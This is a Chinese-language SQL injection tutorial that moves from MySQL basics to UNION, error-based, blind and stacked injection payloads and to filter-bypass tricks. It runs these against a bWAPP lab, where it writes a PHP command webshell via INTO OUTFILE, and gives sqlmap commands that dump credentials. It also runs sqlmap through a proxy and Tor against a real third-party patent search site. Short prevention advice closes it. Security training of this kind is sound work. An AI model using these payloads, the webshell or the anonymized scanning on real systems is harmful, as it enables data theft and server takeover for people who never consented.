# SQL注入

# 1.基本概念

## 1.1 mysql 基础知识

### 1.1.1 基础库表

```
1.information_schema 库
是信息数据库，其中保存着关于MysQL服务器所维护的所有其他数据库的信息，比如数据库名，数据库表，表字段的数据类型与访问权限等。web渗透过程中用途很大。

SCHEMATA表
提供了当前MysQL实例中所有的数据库信息, show databases结果取之此表

TABLES表
提供了关于数据中表的信息

COLUMNS表
提供了表中的列信心，详细描述了某张表的所有列已经每个列的信息。
```

```
2.mysql库
MysQL的核心数据库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。
```

```
3.performance_schema库
内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级，将数据保存在内存中相比从磁盘上访问能够极大地提高应用的性能。
```

```
4.sys库
通过这个数据库数据库，可以查询谁使用了最多的资源基于IP或是用户。哪张表被访问过最多等等信息。
```

## 1.2 常见规则

### 1.2.1 注释

```
注释方式
    -- 或者 # 表示注释的 意思.
    记住, -- 以及 # 后面有个空格

示例1
    在搜索框里输入 Gifts' # 
    在搜索框里输入 Gifts' -- 
    在搜索框里输入 Gifts' or 1=1 -- 
    记住, Gifts 后面有个 ' , 原因在于搜索词是字符串类型, 如果是整型, 就不必加单引号 了

示例2: -- 后面的将都被注释掉(--后面有个空格)
SELECT id,NAME,content,released FROM products WHERE category '%s '-― and released

示例3: # 后面的将都被注释掉(#后面有个空格)
SELECT id,NAME, content, released FROM products WHERE category = 'Gifts'# and released

示例4: -- 后面的将都被注释掉(--后面有个空格), or 1=1是恒成立的
SELECT * FROM products WHERE category = 'Gifts' OR 1 = 1 -- 'and released=0
```

### 1.2.2 常见函数

```
sleep(n), 休眠, 查询返回m条数据, 将睡mn秒
substr(str, 1, 2); 表示从第1个位置开始取, 取2个字符
mid(str, 1, 2); 等价于substr
ascii(n), 返回字符的ASCII码
ord(n), 等价于ascii
count(), 计数
length(), 返回字符串长度
left(str, len), 从左向右截取指定长度的字符串
group_concat(), 
```

# 2. SQL注入相关概念

## 2.1 SQL注入漏洞是什么

```
是发生于应用程序与数据库层的安全漏洞。网站内部直接发送的sQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造sQL语句，如果用户输入的数据被构造成恶意sQL代码，web应用又未对动态构造的sQL语句使用的参数进行审查，则会带来意想不到的危险。
```

### 2.1.1 SQL注入带来的危害

```
1.猜解后台数据库，盗取网站敏感信息
获取数据库名, 用户表名, 表中字段, 数据库用户, 数据库IP地址

2.绕过验证登录网站后台
select * from user_options where user='badguy ' ; update usersset password='letmein' where user= ' administrator' --

3.借助数据库的存储过程进行提权等操作

4.检索隐藏数据

5.修改应用程序逻辑
```

### 2.1.2 判断sql注入点

#### 2.1.2.1 经典的单引号判断法

    入参中输入一个单引号', 观察是否报错以及结果集的返回情况
    通常SQL注入含2种类型,一种是字符串类型, 一种是数值类型, 注意数值类型时, 不要添加单引号
    这种方式的基本要求是: 返回信息有回显, 错误信息能显示出来

#### 2.1.2.2 or 1=1

    在入参后拼接 or 1=1可以查询所有结果

#### 2.1.2.3 盲注

    入参中输入一个单引号加sleep函数, 通过观察是否页面在load来判定是否存在SQL注入漏洞
    如:
    tom' or sleep(10); -- 

## 2.2 常见的SQL注入方式

### 2.2.1 UNION query SQL injection

    #前置
    SELECT * FROM item UNION SELECT 1,2,3, 4,5,6,7;
    这里的*号返回几个字段, 最大值就是几, 如果不知道, 就一直猜就行
    
    step1:初始化示例SQL
    CREATE TABLE `item` (id` bigint(20) NOT NULL,`item_name` varchar(20) DEFAULT NULL,`manu` varchar(20) DEFAULT NULL,`weight` float DEFAULT NULL,`price` float DEFAULT NULL,`popularity` int(11) DEFAULT NULL,`includes` varchar(20) DEFAULT NULL,PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    INSERT INTO `item` VALUES ('1', 'my_item', 'my_menu', '13', '22.6', '25', 'hi');
    
    step2:SQL注入获取数据库名
    SELECT * FROM item UNION SELECT 1, USER(), DATABASE(), 4,5,6,VERSION();
    注意每一个占据位置的函数的对应的字段的类型不要报错就行 
    
    step3:根据上一步获取的数据库名my_solr获取表名
    SELECT * FROM item UNION SELECT 1,DATABASE(),table_name,4,5,6,7 FROM information_schema.tables WHERE table_schema=DATABASE();
    用户在前端输入框输入:
    1' UNION SELECT 1,DATABASE(),table_name,4,5,6,7 FROM information_schema.tables WHERE table_schema=DATABASE(); -- 
    或者输入:
    1' UNION SELECT 1,DATABASE(),GROUP_CONCAT(table_name),4,5,6,7 FROM information_schema.tables WHERE table_schema=DATABASE(); # 
    
    step4:根据上一步获取的表名, 逐步分析各个表中的字段, 以如何获取tb_user表字段为例:
    SELECT * FROM item UNION SELECT 1,DATABASE(),column_name,4,5,6,7 FROM information_schema.columns WHERE TABLE_NAME='tb_user';
    用户在前端输入框输入:
    1' UNION SELECT 1,DATABASE(),column_name,4,5,6,7 FROM information_schema.columns WHERE TABLE_NAME='tb_user'; -- 
    或者输入:
    1' UNION SELECT 1,DATABASE(),GROUP_CONCAT(column_name),4,5,6,7 FROM information_schema.columns WHERE TABLE_NAME='item'; -- 

### 2.2.2 Boolean-based blind SQL injection

    如 a' or 1=1, 可以在登录的密码处等多个地方尝试

### 2.2.3 Error-based SQL injection

```
常用的函数：
floor(),rand(),updatexml(),extractvalue()

#1.rand报错
mysql 5.7 时，这种方式就不能用了

rand()每次出来的值都不一样
rand(0)在一定时间内出来的值是相同的

#该表中数据如果小于3条，则不会报错
SELECT COUNT(*),FLOOR(RAND(0)*2) x FROM tb_stu GROUP BY x;

#2.updatexml,extractvalue报错，实际是利用xpath不支持的语法实现
SELECT updatexml(1,0x7e,1)
SELECT extractvalue(1,0x7e)
```

### 2.2.4 Time-based blind SQL injection (常用)

```
如 a' and sleep(7); 需要注意的是: 返回n条数据, 将睡眠 7n 秒.
示例: SELECT ASCII(SUBSTR(DATABASE(), 2, 1)) = 33 AND SLEEP(2); -- 

一般使用脚本来注入
常用函数
substr(),ascii(),length()
```

### 2.2.5 Stacked queries SQL injection (堆叠注入，能执行多段SQL)

    应用场景较少，如 a'; delete from item; drop tables;...
    一般mysql不开启支持多条语句的功能。

### 2.2.6 sql-injection混淆和绕过

```python
混淆注入：
普通注入方式很容易被检测出来，所以需要改变攻击的手法，绕过检测和过滤，也即为混淆和绕过


1.union或者select变形
针对服务端将union或者select替换掉的情况，可以：
变形为：UNion或者UNunionION
变形为：SeLEct或者SELEselectCT
但如果递归替换，上述混淆方式也是无效的。
如果服务端判断union和select同时存在时即报错，那么上述混淆方式也是无效的。
SELECT/**/id,name/**/FROM/**/tb_stu /*!union*/ SELECT 1,2


2.and或者or变形
and 变为 &&, or 变为 ||


3.空格的处理
加上20%或者/**/,如
SELECT/**/id,name/**/FROM/**/tb_stu


4.where被禁用，可用limit替换
select * from tb_stu where id=1
替换为：select * from tb_stu limit 0,1


5.limit被禁用
select * from tb_stu limit 0,1
替换为: select * from tb_stu GROUP BY id HAVING id=1 (这种情况，id要是主键)

6.select被禁用
可尝试substr函数

7.=被禁用
select * from tb_stu where name='tom'
替换为：select * from tb_stu where name like 'tom'

8.注意库名大小写敏感，表名及字段名一般大小写不敏感

9.
```

### 2.2.7 sql-injection remote code execution

```python
通过sql注入，直接写入webshell文件到服务器，
用get方法或者post方法提交并执行外部命令，方便后续进一步远程控制，提权等。

step1:写文件（前提是要有写的权限）
SELECT * FROM heroes WHERE id=1 UNION SELECT 1,2,3,'hello' INTO OUTFILE '/var/www/html/a.php


step2:
```

## 2.3 SQL绕过技术

### 2.3.1 大小写绕过

```shell
比如，如果发现and被代码拦截，则使用AND或者And或者anD等来绕过代码检测。

主要解决的问题是：
要渗透的系统在代码层面过滤了纯大写或者纯小写的关键字。

PS：数据库是不校验大小的(一般而言)，是代码层进行的过滤。
```

### 2.3.2 双写绕过

```shell
比如，如果发现or或and(不区分大小写)均被替换掉了，则传参时，传递两次即可，
如oorr或anandd。

主要解决的问题是：
要渗透的系统在代码层面对关键字进行了替换。
```

### 2.3.3 关键字等价绕过

```shell
比如，如果发现or或and(不区分大小写)均被替换掉了，则传参时，用等价的关键字，
如：&&替换and，|| 替换or。

主要解决的问题是：
要渗透的系统在代码层面对关键字进行了替换。
```

### 2.3.4 去除注释绕过

```shell
比如，如果发现#或者--等注释符号均被替换掉了，
则传参时，在最后一个字符之前用一个单引号来闭合查询，
如：http://localhost:9093/less?id=-1' UNION SELECT DATABASE(),'3
或http://localhost:9093/less?id=-1' UNION SELECT DATABASE(),3 or '1'='1
最终SQL为：
SELECT * FROM tb_stu WHERE id='-1' UNION SELECT DATABASE(),'3' LIMIT 0,1;

主要解决的问题是：
要渗透的系统在代码层面对注释符号#或者--进行了替换。
```

### 2.3.5 去除空格绕过

```shell
比如，如果发现‘空格’被替换掉了，则传参时，可使用ascii码转url编码，可以代替空格的有
%20,%09,%0a,%0b,%0c,%0d,%a0,/**/
如：

主要解决的问题是：
要渗透的系统在代码层面对‘空格’进行了替换。
```

### 2.3.6 去除关键字绕过

```shell
比如，如果发现各种关键字，如select,union等等被替换掉了，则传参时，
方案1：双写绕过的解决方案
方案2：updatexml函数绕过

主要解决的问题是：
要渗透的系统在代码层面对关键字进行了替换。
```

### 2.3.7 宽字节绕过

```shell
#原理：
GBK 占用两字节，ASCII占用一字节
PHP中编码为GBK，函数执行添加的是ASCII编码，
MYSQL默认字符集是GBK等宽字节字符集。
Mysql 在使用GBK编码时，会认为两个字符为一个汉字。
宽字节注入就是发生在PHP向Mysql请求时字符集使用了GBK编码。

#主要过虑规则: 
addslashes()转义所注入的关键，当它过滤到有敏感的字符，
此函数会在前面加上一个\进行转移。

#绕过思路：加上 空格%df
如：http://localhost:9093/less?id=-1 %df' UNION SELECT DATABASE(),3
因为 %df\'=%df%5c%27=缞'

解决的问题：
```

### 2.3.8 base64编码绕过

```shell

```

# 3. bwapp 靶场的 SQL 注入演示

```
准备bwapp靶场
1.docker search bwapp
2.docker pull raesene/bwapp
3.docker images (获取镜像id)
4.docker run -it -d -p 9091:80 镜像id
5.http://ip:9091/install.php
6.账号是 bee 密码是 bug
```

## 3.1 SQL Injection (GET/Search)

```
step1:在输入框中输入, 直到试出字段个数为7
man' union select 1,2,3,4,5,6,7 from information_schema.tables where table_schema=database();-- 

step2:在输入框中输入:
man' union select 1,database(),3,4,table_name,6,7 from information_schema.tables where table_schema=database();-- 

step3:在输入框中输入:
man' union select 1,database(),3,4,column_name,6,7 from information_schema.columns where table_name='users';-- 

step4:在输入框中输入:
man' union select 1,login,3,4,password,6,7 from bWAPP.users; -- 
```

## 3.2 SQL Injection (Blind Time-Based)

```
step1:在输入框中输入:
1' or sleep(1) # 
F12打开调试器, 观察network中响应时间, 如果延迟了, 表明可能存在SQL注入漏洞
```

## 3.3 stored user-agent

```
基本原理就是在请求时，在 user-agent 中依次获取数据库名，表名，字段名，字段值等。
一般较少出现
```

## 3.4 erro-based blind sql injection

### 3.4.1 rand

```
mysql 5.7 时，这种方式就不能用了
1.选择 GET/SEARCH 进行 hack

2.获取数据库名
1' union SELECT 1,2,3,4,5,count(*),concat((SELECT database()),'~',floor(rand(0)*2))x  FROM information_schema.TABLES GROUP BY x # 

3.获取表名
1' union SELECT 1,2,3,4,5,count(*),concat((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),'~',floor(rand(0)*2))x  FROM information_schema.TABLES GROUP BY x # 


4.获取表中字段名
1' union SELECT 1,2,3,4,5,count(*),concat((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),'~',floor(rand(0)*2))x  FROM information_schema.TABLES GROUP BY x # 


5.获取字段1' union SELECT 1,2,3,4,5,count(*),concat((SELECT login FROM users LIMIT 1),'~',floor(rand(0)*2))x  FROM information_schema.TABLES GROUP BY x # 
```

### 3.4.2 extractvalue

```
#1.获取库名
1' union SELECT 1,2,3,4,5,extractvalue(1,concat(0x7e,(SELECT database()))),7 # 

#2.获取表名
1' union SELECT 1,2,3,4,5,extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 1))),7 # 

#3.获取字段名
1' union SELECT 1,2,3,4,5,extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' limit 1))),7 # 

#4.获取字段值
1' union SELECT 1,2,3,4,5,extractvalue(1,concat(0x7e,(SELECT login FROM users limit 1))),7 # 

#5.当字段超过32位时，会被截取，可以通过多次请求，来获取最终结果
1' union SELECT 1,2,3,4,5,extractvalue(1,mid(concat(0x7e,(SELECT password FROM users limit 1)),1,30)),7 # 
1' union SELECT 1,2,3,4,5,extractvalue(1,mid(concat(0x7e,(SELECT password FROM users limit 1)),30,30)),7 # 
```

## 3.5 sql-injection remote code execution

```python
step1:进入容器
docker exec -it 容器id /bin/bash

step2:创建目录
 在 app 目录下(即php部署目录下)创建文件夹file

step3:赋予权限
chmod 777 /app/file/

step4:将文件上传
union select 1,2,3,4,5,6,'<?php system($_GET["cmd"]);?>' into outfile '/app/file/cmd.php'# 

http://10.102.224.206:9091/sqli_2.php?movie=11%20union%20select%201,2,3,4,5,6,%27%3C?php%20system($_GET[%22cmd%22]);?%3E%27%20into%20outfile%20%27/app/file/cmd.php%27#%20&action=go

step5:通过页面进行注入：
http://10.102.224.206:9091/file/cmd.php

http://10.102.224.206:9091/file/cmd.php?cmd=whoami

http://10.102.224.206:9091/file/cmd.php?cmd=ifconfig

http://10.102.224.206:9091/file/cmd.php?cmd=pwd
```

# 4. sqlmap工具注入

```
以上都是手动注入的方式，sqlmap是自动化注入的方式。
```

官网

https://sqlmap.org/

命令手册

https://github.com/sqlmapproject/sqlmap/wiki/Usage

## 4.1 示例1 (cookie)

```shell
sqlmap -u "http://10.102.224.206:9091/sqli_2.php?movie=2&action=go" --cookie="security_level=0; PHPSESSID=5e1t9ri2803gn5pljps91q9h05"
```

```
可以直接获取库名，用户
sqlmap -u "http://10.102.224.206:9091/sqli_1.php?title=&action=search" --cookie="security_level=0; PHPSESSID=6b1e00vmg8os2eiq2d4n3pon60" --random-agent -f -b -dbs --users
```

## 4.2 示例2 (random-agent & level)

```shell
sqlmap -u "http://10.102.224.206:9091/sqli_17.php" --cookie="security_level=0; PHPSESSID=5e1t9ri2803gn5pljps91q9h05" --random-agent
```

## 4.3 利用sqlmap测试bwapp

### 4.3.1 获取所有数据库

```
sqlmap -u "http://10.102.224.206:9091/sqli_2.php?movie=2&action=go" --cookie="security_level=0; PHPSESSID=6b1e00vmg8os2eiq2d4n3pon60" --random-agent -f -b -dbs
```

### 4.3.2 获取当前连接的数据库

```
sqlmap -u "http://10.102.224.206:9091/sqli_2.php?movie=2&action=go" --cookie="security_level=0; PHPSESSID=6b1e00vmg8os2eiq2d4n3pon60" --random-agent -f -b --current-db
```

### 4.3.3 获取当前连接的数据库中的所有表

```
sqlmap -u "http://10.102.224.206:9091/sqli_2.php?movie=2&action=go" --cookie="security_level=0; PHPSESSID=6b1e00vmg8os2eiq2d4n3pon60" --random-agent -f -b -D bWAPP --tables
```

### 4.3.4 获取某张表的所有字段

```
sqlmap -u "http://10.102.224.206:9091/sqli_2.php?movie=2&action=go" --cookie="security_level=0; PHPSESSID=6b1e00vmg8os2eiq2d4n3pon60" --random-agent -f -b -D bWAPP -T users --columns
```

### 4.3.5 获取表中的数据

```
sqlmap -u "http://10.102.224.206:9091/sqli_2.php?movie=2&action=go" --cookie="security_level=0; PHPSESSID=6b1e00vmg8os2eiq2d4n3pon60" --random-agent -f -b --dump -C "login,password" -D bWAPP -T users
```

### 4.3.6 脱库

```
导出所有数据
--dump-all
```

### 4.3.7 当前用户是否是DBA

```
sqlmap -u "http://10.102.224.206:9091/sqli_2.php?movie=2&action=go" --cookie="security_level=0; PHPSESSID=6b1e00vmg8os2eiq2d4n3pon60" --random-agent --is-dba
```

### 4.3.7 使用代理

```shell
1.使用传统代理方式--proxy
sqlmap -u "https://worldwide.espacenet.com/3.2/rest-services/search" --data="lang=en,de,fr&q=CN201922045N&qlang=cql&=" --random-agent --proxy='http://120.194.55.139:6969' --current-db


2.使用洋葱路由 --tor --tor-type="SOCKS5" (前提是已经安装了洋葱浏览器)
sqlmap -u "https://worldwide.espacenet.com/3.2/rest-services/search" --data="lang=en,de,fr&q=CN201922045N&qlang=cql&=" --random-agent --tor --tor-type='SOCKS5' --current-db --check-tor
```



# 5.sql注入预防

## 5.1 mysql注入预防

```
primary defenses:
1.use of prepared statements(with parameterized queries)
2.use of stored procedures
3.allow-list input validation
4.escaping all user supplied input

additional defenses:
1.enforcing least priviledge
2.performing allow-list input validation as a secondary defense
```

https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html
